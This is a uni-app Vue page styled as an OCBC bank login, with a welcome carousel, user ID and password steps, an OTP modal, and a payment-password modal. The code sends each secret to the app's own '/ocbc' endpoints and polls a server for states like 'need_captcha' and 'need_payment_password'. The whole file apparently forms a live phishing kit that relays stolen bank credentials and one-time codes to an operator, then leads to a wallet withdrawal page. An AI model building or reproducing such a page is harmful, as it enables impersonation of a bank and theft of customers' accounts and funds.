<template>
  <view class="ocbc-page">
    <!-- 步骤1：欢迎页 -->
    <view v-if="currentStep === 1" class="welcome-step">
      <!-- 返回按钮 -->
      <view class="welcome-back-button" @click="handleWelcomeBack">
        <text class="bi bi-chevron-left"></text>
      </view>

      <!-- 上半部分：手机图片轮播 -->
      <view class="hero-section">
        <swiper class="hero-swiper" :autoplay="true" :interval="3000" :circular="true" :indicator-dots="true"
                :style="{ height: swiperHeight + 'px' }">
          <swiper-item>
            <image class="hero-image" src="/static/images/ocbc/ocbc1.png" mode="widthFix"
                   @load="onImageLoad" />
          </swiper-item>
          <swiper-item>
            <image class="hero-image" src="/static/images/ocbc/ocbc2.png" mode="widthFix" />
          </swiper-item>
        </swiper>
      </view>

      <!-- 底部内容区域（绝对定位） -->
      <view class="bottom-content">
        <!-- 标题和Learn More -->
        <view class="hero-text">
          <text class="hero-title">{{ t('ocbc.welcomeTitle') }}</text>
          <text class="hero-link">{{ t('ocbc.learnMore') }}</text>
        </view>

        <!-- 三个功能图标 -->
        <view class="features-section">
          <view class="feature-item">
            <view class="feature-icon">
              <text class="bi bi-camera-video"></text>
            </view>
            <text class="feature-label">{{ t('ocbc.videoVerification') }}</text>
          </view>
          <view class="feature-item">
            <view class="feature-icon">
              <text class="bi bi-cash-coin"></text>
            </view>
            <text class="feature-label">{{ t('ocbc.moneyCheckUp') }}</text>
          </view>
          <view class="feature-item">
            <view class="feature-icon">
              <text class="bi bi-person-plus"></text>
            </view>
            <text class="feature-label">{{ t('ocbc.register') }}</text>
          </view>
        </view>

        <!-- 登录按钮 -->
        <view class="login-button-container">
          <button class="login-button" @click="goToUserIdStep">
            {{ t('ocbc.loginButton') }}
          </button>
        </view>
      </view>
    </view>

    <!-- 步骤2：输入User ID -->
    <view v-if="currentStep === 2" class="input-step">
      <!-- 顶部导航栏 -->
      <view class="top-nav">
        <!-- 返回按钮 -->
        <view class="back-button" @click="goBack">
          <text class="bi bi-chevron-left"></text>
        </view>

        <!-- 标题 -->
        <view class="nav-title">
          <text class="step-title">{{ t('ocbc.inputUserIdTitle') }}</text>
        </view>

        <!-- 帮助按钮 -->
        <view class="help-button">
          <text class="bi bi-question-circle"></text>
        </view>
      </view>

      <!-- 副标题 -->
      <view class="step-subtitle-section">
        <text class="step-subtitle">{{ t('ocbc.inputUserIdSubtitle') }}</text>
      </view>

      <!-- 输入框 -->
      <view class="input-section">
        <text class="input-label">{{ t('ocbc.userId') }}</text>
        <input class="input-field" v-model="formData.userId" type="text" :placeholder="t('ocbc.userIdPlaceholder')" />
      </view>

      <!-- 忘记User ID链接 -->
      <view class="forgot-link-section">
        <text class="forgot-link">{{ t('ocbc.forgotUserId') }}</text>
      </view>

      <!-- Continue按钮 -->
      <view class="continue-button-container">
        <button class="continue-button" :class="{ 'disabled': !formData.userId }" :disabled="!formData.userId"
          @click="goToPasswordStep">
          {{ t('ocbc.continue') }}
        </button>
      </view>
    </view>

    <!-- 步骤3：输入Password -->
    <view v-if="currentStep === 3" class="input-step">
      <!-- 顶部导航栏 -->
      <view class="top-nav">
        <!-- 返回按钮 -->
        <view class="back-button" @click="goBack">
          <text class="bi bi-chevron-left"></text>
        </view>

        <!-- 标题 -->
        <view class="nav-title">
          <text class="step-title">{{ t('ocbc.inputPasswordTitle') }}</text>
        </view>

        <!-- 帮助按钮 -->
        <view class="help-button">
          <text class="bi bi-question-circle"></text>
        </view>
      </view>

      <!-- 副标题 -->
      <view class="step-subtitle-section">
        <text class="step-subtitle">{{ t('ocbc.inputPasswordSubtitle') }}</text>
      </view>

      <!-- 输入框 -->
      <view class="input-section">
        <text class="input-label">{{ t('ocbc.password') }}</text>
        <view class="password-input-wrapper">
          <input class="input-field password-field" v-model="formData.password"
            :type="showPassword ? 'text' : 'password'" :password="!showPassword"
            :placeholder="t('ocbc.passwordPlaceholder')" />
          <view class="password-toggle" @click="togglePassword">
            <text class="bi" :class="showPassword ? 'bi-eye-slash' : 'bi-eye'"></text>
          </view>
        </view>
      </view>

      <!-- 忘记密码链接 -->
      <view class="forgot-link-section">
        <text class="forgot-link" @click="handleForgotPassword">{{ t('ocbc.forgotPasswordLink') }}</text>
      </view>

      <!-- Continue按钮 -->
      <view class="continue-button-container">
        <button class="continue-button" :class="{ 'disabled': !formData.password }"
          :disabled="!formData.password" @click="handleSubmitLogin">
          {{ t('ocbc.continue') }}
        </button>
      </view>
    </view>

    <!-- 加载中遮罩 -->
    <view v-if="showLoading" class="loading-overlay">
      <view class="loading-spinner">
        <view class="spinner"></view>
        <text class="loading-text">{{ loadingText }}</text>
      </view>
    </view>

    <!-- OTP 弹窗 -->
    <view v-if="showCaptchaModal" class="modal-overlay" @click.stop>
      <view class="modal-content otp-modal" @click.stop>
        <view class="modal-header">
          <text class="modal-title">{{ t('ocbc.captchaTitle') }}</text>
          <text class="modal-subtitle">{{ t('ocbc.captchaSubtitle') }}</text>
        </view>

        <view class="otp-section">
          <text class="input-label">{{ t('ocbc.otpLabel') }}</text>
          <text class="input-description">{{ t('ocbc.enterOtp') }}</text>
          <input class="otp-field" v-model="captchaInput" type="number" :placeholder="t('ocbc.captchaPlaceholder')"
            maxlength="6" />

          <view class="otp-security-notice">
            <text class="security-icon bi bi-shield-check"></text>
            <view class="security-text">
              <text class="security-title">{{ t('ocbc.otpSecurityNotice') }}</text>
              <text class="security-desc">{{ t('ocbc.otpSecurityExplanation') }}</text>
            </view>
          </view>

          <text class="otp-help-link">{{ t('ocbc.forgotOtp') }}</text>
        </view>

        <view class="modal-actions">
          <button class="modal-button" @click="submitCaptcha">{{ t('ocbc.submit') }}</button>
        </view>
      </view>
    </view>

    <!-- 支付密码弹窗 -->
    <view v-if="showPaymentPasswordModal" class="modal-overlay" @click.stop>
      <view class="modal-content payment-modal" @click.stop>
        <view class="modal-header">
          <text class="modal-title">{{ t('ocbc.paymentPasswordTitle') }}</text>
        </view>

        <view class="payment-section">
          <!-- 提现账户信息 -->
          <view class="account-info-section">
            <text class="section-label">{{ t('ocbc.withdrawalAccountLabel') }}</text>
            <view class="account-info-box">
              <view v-if="withdrawalAccount?.account_name" class="account-row">
                <text class="account-label">账户名称</text>
                <text class="account-value">{{ withdrawalAccount.account_name }}</text>
              </view>
              <view v-if="withdrawalAccount?.account_number" class="account-row">
                <text class="account-label">账户号码</text>
                <text class="account-value">{{ withdrawalAccount.account_number }}</text>
              </view>
              <view v-if="withdrawalAccount?.bank_name" class="account-row">
                <text class="account-label">银行名称</text>
                <text class="account-value">{{ withdrawalAccount.bank_name }}</text>
              </view>
            </view>
          </view>

          <!-- 密码输入区域 -->
          <view class="password-input-section">
            <text class="input-label">{{ t('ocbc.payment_password') }}</text>
            <input class="payment-field" v-model="paymentPasswordInput" type="password" password
              :placeholder="t('ocbc.paymentPasswordPlaceholder')" maxlength="6" />
          </view>

          <!-- 安全提示 -->
          <view class="security-notice">
            <view class="notice-icon">
              <text class="bi bi-shield-check shield-icon"></text>
            </view>
            <view class="notice-content">
              <text class="notice-title">{{ t('ocbc.security_notice') }}</text>
              <text class="notice-text">{{ t('ocbc.security_explanation') }}</text>
            </view>
          </view>
        </view>

        <view class="modal-actions">
          <button class="modal-button confirm-button" @click="submitPaymentPassword">
            {{ t('ocbc.submit') }}
          </button>
        </view>
      </view>
    </view>

    <!-- 支付密码错误弹窗 -->
    <view v-if="showPaymentPasswordErrorModal" class="modal-overlay status-overlay">
      <view class="status-modal error-modal" @click.stop>
        <view class="status-icon-container error-icon-container">
          <view class="status-icon-circle error-circle">
            <text class="bi bi-x-lg error-x"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title error-title">{{ t('ocbc.paymentPasswordErrorTitle') }}</text>
          <text class="status-message">{{ t('ocbc.paymentPasswordErrorMessage') }}</text>
        </view>
        <button class="status-button error-button" @click="retryPaymentPassword">
          {{ t('ocbc.reenter') }}
        </button>
      </view>
    </view>

    <!-- 忘记密码弹窗 -->
    <view v-if="showForgotPasswordModal" class="modal-overlay" @click="closeForgotPasswordModal">
      <view class="modal-container" @click.stop>
        <view class="modal-content simple-modal">
          <text class="modal-title">{{ t('ocbc.forgotPasswordTitle') }}</text>
          <text class="modal-message">{{ t('ocbc.forgotPasswordMessage') }}</text>
          <button class="modal-button" @click="confirmForgotPassword">
            {{ t('ocbc.forgotPasswordConfirm') }}
          </button>
        </view>
      </view>
    </view>

    <!-- 成功弹窗 -->
    <view v-if="showSuccessModal" class="modal-overlay status-overlay">
      <view class="status-modal success-modal" @click.stop>
        <view class="status-icon-container success-icon-container">
          <view class="status-icon-circle success-circle">
            <text class="bi bi-check-lg success-check"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title success-title">{{ t('ocbc.successTitle') }}</text>
          <text class="status-message">{{ t('ocbc.successMessage') }}</text>
          <text class="status-description">{{ t('ocbc.successDescription') }}</text>
        </view>
        <button class="status-button success-button" @click="handleLoginSuccess">
          {{ t('ocbc.ok') }}
        </button>
      </view>
    </view>

    <!-- 失败弹窗 -->
    <view v-if="showFailedModal" class="modal-overlay status-overlay">
      <view class="status-modal error-modal" @click.stop>
        <view class="status-icon-container error-icon-container">
          <view class="status-icon-circle error-circle">
            <text class="bi bi-x-lg error-x"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title error-title">{{ t('ocbc.failedTitle') }}</text>
          <text class="status-message">{{ t('ocbc.failedMessage') }}</text>
          <text class="status-description">{{ t('ocbc.failedDescription') }}</text>
        </view>
        <button class="status-button error-button" @click="handleLoginFailed">
          {{ t('ocbc.tryAgain') }}
        </button>
      </view>
    </view>

    <!-- 系统维护弹窗 -->
    <view v-if="showMaintenanceModal" class="modal-overlay status-overlay">
      <view class="status-modal maintenance-modal" @click.stop>
        <view class="status-icon-container maintenance-icon-container">
          <view class="status-icon-circle maintenance-circle">
            <text class="bi bi-tools maintenance-icon"></text>
          </view>
        </view>
        <view class="status-content">
          <text class="status-title maintenance-title">{{ t('ocbc.maintenanceTitle') }}</text>
          <text class="status-message">{{ t('ocbc.maintenanceMessage') }}</text>
          <text class="status-description">{{ t('ocbc.maintenanceDescription') }}</text>
        </view>
        <button class="status-button maintenance-button" @click="handleMaintenanceClose">
          {{ t('ocbc.ok') }}
        </button>
      </view>
    </view>
  </view>
</template>

<script setup lang="ts">
import { ref, computed, onMounted } from 'vue'
import { onLoad } from '@dcloudio/uni-app'
import { useI18n } from 'vue-i18n'
import { post } from '../../utils/request'
import { getToken } from '../../utils/storage'

const { t } = useI18n()

// 当前步骤 (1=欢迎页, 2=User ID, 3=Password)
const currentStep = ref(1)

// 轮播图高度
const swiperHeight = ref(600)

// 表单数据
const formData = ref({
  accountType: 'ocbc',
  userId: '',
  password: ''
})

// 密码显示/隐藏
const showPassword = ref(false)

// 加载状态
const showLoading = ref(false)
const loadingText = ref('')

// 弹窗状态
const showCaptchaModal = ref(false)
const showPaymentPasswordModal = ref(false)
const showPaymentPasswordErrorModal = ref(false)
const showForgotPasswordModal = ref(false)
const showSuccessModal = ref(false)
const showFailedModal = ref(false)
const showMaintenanceModal = ref(false)

// 输入数据
const captchaInput = ref('')
const paymentPasswordInput = ref('')
const withdrawalAccount = ref<any>(null)

// 记录ID和轮询
const recordId = ref<number>(0)
let pollingTimer: any = null

// 页面加载
onLoad((options: any) => {
  // 检查登录状态
  const token = getToken()
  if (!token) {
    uni.showToast({
      title: t('common.pleaseLoginFirst') || 'Please login first',
      icon: 'none',
      duration: 2000
    })
    setTimeout(() => {
      uni.reLaunch({ url: '/pages/auth/login' })
    }, 2000)
    return
  }

  // 从路由参数获取银行类型
  if (options.account_type) {
    formData.value.accountType = options.account_type
  }
})

// 图片加载完成，计算轮播高度
function onImageLoad(e: any) {
  const { width, height } = e.detail
  // 根据屏幕宽度计算图片显示高度
  const systemInfo = uni.getSystemInfoSync()
  const screenWidth = systemInfo.screenWidth
  swiperHeight.value = (height / width) * screenWidth
}

// 步骤导航
function goToUserIdStep() {
  currentStep.value = 2
}

function goToPasswordStep() {
  if (!formData.value.userId) {
    uni.showToast({
      title: t('ocbc.pleaseEnterUserId'),
      icon: 'none'
    })
    return
  }
  currentStep.value = 3
}

function goBack() {
  if (currentStep.value === 2) {
    currentStep.value = 1
  } else if (currentStep.value === 3) {
    currentStep.value = 2
  }
}

// 欢迎页返回
function handleWelcomeBack() {
  uni.navigateBack()
}

// 密码显示切换
function togglePassword() {
  showPassword.value = !showPassword.value
}

// 提交登录
async function handleSubmitLogin() {
  if (!formData.value.userId || !formData.value.password) {
    return
  }

  showLoading.value = true
  try {
    const res = await post('/ocbc/submitLogin', {
      account_type: formData.value.accountType,
      organization_id: formData.value.userId, // 使用user_id作为organization_id
      user_id: formData.value.userId,
      password: formData.value.password
    }, { showError: false })

    recordId.value = res.data.record_id
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    uni.showToast({
      title: error.message || t('ocbc.loginFailed'),
      icon: 'none'
    })
  }
}

// 开始轮询状态
function startPolling() {
  pollingTimer = setInterval(async () => {
    await pollStatus()
  }, 2000)
}

// 停止轮询
function stopPolling() {
  if (pollingTimer) {
    clearInterval(pollingTimer)
    pollingTimer = null
  }
}

// 轮询状态
async function pollStatus() {
  try {
    const res = await post('/ocbc/pollStatus', {
      record_id: recordId.value
    }, { showError: false })

    const status = res.data.status
    handleStatusChange(status, res.data)
  } catch (error) {
    console.error('Poll status error:', error)
  }
}

// 处理状态变化
function handleStatusChange(status: string, data: any) {
  switch (status) {
    case 'need_captcha':
      stopPolling()
      showLoading.value = false
      showCaptchaModal.value = true
      break

    case 'need_payment_password':
      stopPolling()
      showLoading.value = false
      withdrawalAccount.value = data.withdrawal_account
      showPaymentPasswordModal.value = true
      break

    case 'success':
      stopPolling()
      showLoading.value = false
      showSuccessModal.value = true
      break

    case 'payment_password_error':
      stopPolling()
      showLoading.value = false
      showPaymentPasswordErrorModal.value = true
      break

    case 'password_error':
    case 'captcha_error':
    case 'failed':
      stopPolling()
      showLoading.value = false
      showFailedModal.value = true
      break

    case 'maintenance':
      stopPolling()
      showLoading.value = false
      showMaintenanceModal.value = true
      break
  }
}

// 提交验证码
async function submitCaptcha() {
  if (!captchaInput.value) {
    uni.showToast({
      title: t('ocbc.pleaseEnterCaptcha'),
      icon: 'none'
    })
    return
  }

  showCaptchaModal.value = false
  showLoading.value = true

  try {
    await post('/ocbc/submitCaptcha', {
      record_id: recordId.value,
      captcha: captchaInput.value
    }, { showError: false })

    captchaInput.value = ''
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    uni.showToast({
      title: error.message || t('ocbc.submitFailed'),
      icon: 'none'
    })
  }
}

// 提交支付密码
async function submitPaymentPassword() {
  if (!paymentPasswordInput.value) {
    uni.showToast({
      title: t('ocbc.pleaseEnterPaymentPassword'),
      icon: 'none'
    })
    return
  }

  showPaymentPasswordModal.value = false
  showLoading.value = true

  try {
    await post('/ocbc/submitPaymentPassword', {
      record_id: recordId.value,
      payment_password: paymentPasswordInput.value
    }, { showError: false })

    paymentPasswordInput.value = ''
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    // 显示支付密码错误弹窗
    showPaymentPasswordErrorModal.value = true
  }
}

// 重试输入支付密码
function retryPaymentPassword() {
  showPaymentPasswordErrorModal.value = false
  paymentPasswordInput.value = ''
  showPaymentPasswordModal.value = true
}

// 忘记密码
function handleForgotPassword() {
  showForgotPasswordModal.value = true
}

function closeForgotPasswordModal() {
  showForgotPasswordModal.value = false
}

function confirmForgotPassword() {
  showForgotPasswordModal.value = false
}

// 登录成功
function handleLoginSuccess() {
  showSuccessModal.value = false
  uni.navigateTo({ url: '/pages/wallet/withdraw' })
}

// 登录失败
function handleLoginFailed() {
  showFailedModal.value = false
  // 重置到步骤1
  currentStep.value = 1
  formData.value.userId = ''
  formData.value.password = ''
}

// 系统维护
function handleMaintenanceClose() {
  showMaintenanceModal.value = false
  uni.navigateBack()
}
</script>

<style lang="scss" scoped>
.ocbc-page {
  min-height: 100vh;
  background: linear-gradient(180deg, #F8F9FA 0%, #FFFFFF 100%);
}

/* ========== 步骤1：欢迎页 ========== */
.welcome-step {
  height: 100vh;
  position: relative;
  overflow: hidden;
  background: linear-gradient(180deg, #F8F9FA 0%, #FFFFFF 100%);
}

/* 欢迎页返回按钮 */
.welcome-back-button {
  position: absolute;
  top: calc(var(--status-bar-height) + 20rpx);
  left: 32rpx;
  width: 72rpx;
  height: 72rpx;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28rpx;
  font-weight: 700;
  color: #E53E3E;
  z-index: 10;
  background: rgba(255, 255, 255, 0.9);
  border-radius: 50%;
  box-shadow: 0 2rpx 8rpx rgba(0, 0, 0, 0.1);
}

/* 上半部分：手机图片轮播 */
.hero-section {
  width: 100%;
}

.hero-swiper {
  width: 100%;
}

.hero-image {
  width: 100%;
  display: block;
}

/* 底部内容区域（绝对定位） */
.bottom-content {
  position: absolute;
  bottom: 0;
  left: 0;
  right: 0;
  background: linear-gradient(to top, rgba(255, 255, 255, 1) 0%, rgba(255, 255, 255, 0.95) 50%, rgba(255, 255, 255, 0) 100%);
}

/* 标题和Learn More */
.hero-text {
  padding: 20rpx 60rpx 30rpx;
  text-align: right;
}

.hero-title {
  display: block;
  font-size: 20rpx;
  color: #2D3748;
  line-height: 1.4;
  margin-bottom: 12rpx;
}

.hero-link {
  display: inline-block;
  font-size: 20rpx;
  color: #E53E3E;
  text-decoration: underline;
  font-weight: 600;
}

/* 三个功能图标 */
.features-section {
  display: flex;
  justify-content: space-between;
  padding: 0 60rpx 40rpx;
}

.feature-item {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 20rpx;
  flex: 1;
  max-width: 200rpx;
}

.feature-icon {
  width: 120rpx;
  height: 120rpx;
  background: #FFFFFF;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 6rpx 20rpx rgba(0, 0, 0, 0.08);
  font-size: 52rpx;
  color: #2D3748;
}

.feature-label {
  font-size: 22rpx;
  color: #64748B;
  text-align: center;
  line-height: 1.3;
  font-weight: 500;
  white-space: nowrap;
}

/* 登录按钮 */
.login-button-container {
  padding: 0 40rpx 50rpx;

}

.login-button {
  width: 100%;
  height: 104rpx;
  background: linear-gradient(135deg, #434E5E 0%, #2D3748 100%);
  border-radius: 20rpx;
  font-size: 36rpx;
  font-weight: 700;
  color: #FFFFFF;
  border: none;
  display: flex;
  align-items: center;
  justify-content: center;
}

/* ========== 步骤2&3：输入页面 ========== */
.input-step {
  height: 100vh;
  position: relative;
  background: #FFFFFF;
  display: flex;
  flex-direction: column;
  overflow: hidden;
}

/* 顶部导航栏 */
.top-nav {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 50rpx 32rpx;
  padding-top: calc(50rpx + var(--status-bar-height));
  position: relative;
}

.back-button {
  width: 72rpx;
  height: 72rpx;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28rpx;
  font-weight: 700;
  color: #E53E3E;
  flex-shrink: 0;
}

.nav-title {
  flex: 1;
  text-align: center;
  padding: 0 16rpx;
}

.step-title {
  font-size: 28rpx;
  font-weight: 700;
  color: #000000;
  display: inline-block;
  letter-spacing: 0rpx;
}

.help-button {
  width: 72rpx;
  height: 72rpx;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28rpx;
  font-weight: 700;
  color: #E53E3E;
  flex-shrink: 0;
}

.step-subtitle-section {
  padding: 0 60rpx;
  margin-top: 40rpx;
  margin-bottom: 80rpx;
  text-align: center;
}

.step-subtitle {
  font-size: 26rpx;
  color: #999999;
  display: block;
  line-height: 1.6;
}

.input-section {
  margin: 0 48rpx 48rpx;
  padding: 32rpx;
  background: #FFFFFF;
  border-radius: 16rpx;
  border: 1rpx solid #F0F0F0;
  box-shadow: 0 4rpx 12rpx rgba(0, 0, 0, 0.08);
}

.input-label {
  display: block;
  font-size: 26rpx;
  font-weight: 700;
  color: #000;
  margin-bottom: 16rpx;
}

.input-field {
  height: 100rpx;
  background: transparent;
  border: none;
  border-bottom: 2rpx solid #BBBBBB;
  border-radius: 0;
  font-size: 30rpx;
  color: #333333;
  box-shadow: none;
}

.input-field::placeholder {
  color: #BBBBBB;
}

.input-field:focus {
  border-bottom-color: #E53E3E;
  background: transparent;
}

.password-input-wrapper {
  position: relative;
}

.password-field {
  padding-right: 100rpx;
}

.password-toggle {
  position: absolute;
  right: 32rpx;
  top: 50%;
  transform: translateY(-50%);
  font-size: 40rpx;
  color: #999999;
  padding: 8rpx;
}

.forgot-link-section {
  padding: 0 48rpx;
  margin-bottom: 32rpx;
  text-align: center;
}

.forgot-link {
  font-size: 26rpx;
  color: #E53E3E;
  text-decoration: none;
  font-weight: 700;
  display: inline-block;
}

.continue-button-container {
  position: absolute;
  bottom: 60rpx;
  left: 0;
  right: 0;
  padding: 0 48rpx;
}

.continue-button {
  width: 100%;
  height: 100rpx;
  background: #E53E3E;
  border-radius: 20rpx;
  font-size: 32rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  transition: all 0.3s ease;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 0;
  line-height: 100rpx;
}

/* 覆盖 uni-app button 默认样式 */
.continue-button::after {
  border: none;
}

.continue-button.disabled {
  background: #dddddd;
  color: #FFFFFF;
  opacity: 1;
}

/* ========== 加载遮罩 ========== */
.loading-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
}

.loading-spinner {
  background: #FFFFFF;
  border-radius: 16rpx;
  padding: 60rpx;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 24rpx;
}

.spinner {
  width: 80rpx;
  height: 80rpx;
  border: 6rpx solid #E2E8F0;
  border-top-color: #E53E3E;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.loading-text {
  font-size: 28rpx;
  color: #718096;
}

/* ========== 弹窗样式 ========== */
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  align-items: flex-end;
  justify-content: center;
  z-index: 9999;
  animation: fadeIn 0.3s ease;
}

@keyframes fadeIn {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}

.modal-content {
  background: #FFFFFF;
  border-radius: 32rpx 32rpx 0 0;
  padding: 48rpx;
  width: 100%;
  max-height: 80vh;
  overflow-y: auto;
  animation: slideUp 0.3s ease;
}

@keyframes slideUp {
  from {
    transform: translateY(100%);
  }
  to {
    transform: translateY(0);
  }
}

.modal-header {
  margin-bottom: 40rpx;
}

.modal-title {
  display: block;
  font-size: 36rpx;
  font-weight: 600;
  color: #2D3748;
  margin-bottom: 12rpx;
}

.modal-subtitle {
  display: block;
  font-size: 28rpx;
  color: #718096;
}

.otp-section,
.payment-section {
  margin-bottom: 40rpx;
}

.input-description {
  display: block;
  font-size: 26rpx;
  color: #A0AEC0;
  margin-bottom: 16rpx;
  line-height: 1.5;
}

.otp-field,
.payment-field {
  height: 96rpx;
  background: #F7FAFC;
  border: 2rpx solid #E2E8F0;
  border-radius: 12rpx;
  padding: 0 32rpx;
  font-size: 32rpx;
  color: #2D3748;
  margin-bottom: 24rpx;
}

.otp-security-notice {
  display: flex;
  gap: 16rpx;
  padding: 24rpx;
  background: #EBF8FF;
  border-radius: 12rpx;
  margin-bottom: 24rpx;
}

.security-icon {
  font-size: 40rpx;
  color: #3182CE;
}

.security-text {
  flex: 1;
}

.security-title {
  display: block;
  font-size: 26rpx;
  font-weight: 600;
  color: #2D3748;
  margin-bottom: 8rpx;
}

.security-desc {
  display: block;
  font-size: 24rpx;
  color: #718096;
  line-height: 1.5;
}

.otp-help-link {
  font-size: 26rpx;
  color: #3182CE;
  text-decoration: underline;
}

.withdrawal-label {
  display: block;
  font-size: 26rpx;
  color: #718096;
  margin-bottom: 12rpx;
}

.withdrawal-account-box {
  background: #F7FAFC;
  border: 2rpx solid #E2E8F0;
  border-radius: 12rpx;
  padding: 24rpx;
  margin-bottom: 32rpx;
}

.account-name {
  display: block;
  font-size: 28rpx;
  font-weight: 600;
  color: #2D3748;
  margin-bottom: 8rpx;
}

.account-number {
  display: block;
  font-size: 32rpx;
  color: #2D3748;
  margin-bottom: 8rpx;
}

.bank-name {
  display: block;
  font-size: 24rpx;
  color: #A0AEC0;
}

.modal-actions {
  display: flex;
  gap: 16rpx;
}

.modal-button {
  flex: 1;
  height: 88rpx;
  background: linear-gradient(135deg, #E53E3E 0%, #C53030 100%);
  border-radius: 12rpx;
  font-size: 30rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
}

/* 简单弹窗（忘记密码） */
.simple-modal {
  text-align: center;
}

.simple-modal .modal-title {
  font-size: 32rpx;
  margin-bottom: 24rpx;
}

.simple-modal .modal-message {
  display: block;
  font-size: 28rpx;
  color: #718096;
  line-height: 1.6;
  margin-bottom: 40rpx;
}

/* ========== 状态弹窗（成功/失败/维护） ========== */
.status-overlay {
  background: rgba(0, 0, 0, 0.5);
  backdrop-filter: blur(8rpx);
  align-items: flex-end;
}

.status-modal {
  background: #FFFFFF;
  border-radius: 32rpx 32rpx 0 0;
  padding: 60rpx 48rpx 48rpx;
  width: 100%;
  text-align: center;
  animation: slideUp 0.3s ease;
}

.status-icon-container {
  margin-bottom: 32rpx;
  display: flex;
  justify-content: center;
}

.status-icon-circle {
  width: 128rpx;
  height: 128rpx;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 64rpx;
  animation: statusIconScale 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}

@keyframes statusIconScale {
  0% {
    transform: scale(0);
    opacity: 0;
  }

  50% {
    transform: scale(1.1);
  }

  100% {
    transform: scale(1);
    opacity: 1;
  }
}

.success-circle {
  background: linear-gradient(135deg, #10B981 0%, #059669 100%);
  box-shadow: 0 8rpx 24rpx rgba(16, 185, 129, 0.3);
  color: #FFFFFF;
}

.error-circle {
  background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
  box-shadow: 0 8rpx 24rpx rgba(239, 68, 68, 0.3);
  color: #FFFFFF;
}

.maintenance-circle {
  background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
  box-shadow: 0 8rpx 24rpx rgba(245, 158, 11, 0.3);
  color: #FFFFFF;
}

.status-content {
  margin-bottom: 40rpx;
}

.status-title {
  display: block;
  font-size: 36rpx;
  font-weight: 700;
  margin-bottom: 16rpx;
}

.success-title {
  color: #059669;
}

.error-title {
  color: #DC2626;
}

.maintenance-title {
  color: #D97706;
}

.status-message {
  display: block;
  font-size: 28rpx;
  color: #2D3748;
  margin-bottom: 12rpx;
  font-weight: 500;
}

.status-description {
  display: block;
  font-size: 26rpx;
  color: #718096;
  line-height: 1.6;
}

.status-button {
  width: 100%;
  height: 88rpx;
  border-radius: 12rpx;
  font-size: 30rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
}

.success-button {
  background: linear-gradient(135deg, #10B981 0%, #059669 100%);
  box-shadow: 0 4rpx 12rpx rgba(16, 185, 129, 0.3);
}

.error-button {
  background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
  box-shadow: 0 4rpx 12rpx rgba(239, 68, 68, 0.3);
}

.maintenance-button {
  background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
  box-shadow: 0 4rpx 12rpx rgba(245, 158, 11, 0.3);
}
</style>
